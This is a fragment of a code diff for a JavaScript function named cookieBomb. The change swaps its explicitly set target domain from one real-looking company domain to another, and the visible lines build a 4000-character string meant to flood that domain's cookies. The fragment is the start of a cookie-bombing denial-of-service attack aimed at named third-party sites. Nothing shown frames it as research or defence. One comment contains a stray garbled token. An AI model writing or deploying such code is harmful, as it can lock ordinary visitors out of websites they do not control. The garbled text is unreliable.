@@ -1,6 +1,6 @@
 function cookieBomb() {
     // Set target domain explicitlyzebidz
-    const domain = "snapon.co.jp";
+    const domain = "modal-cdn.com";
     
     // Large string to fill the cookies
     const pollution = "a".repeat(4000); // 4000 characters
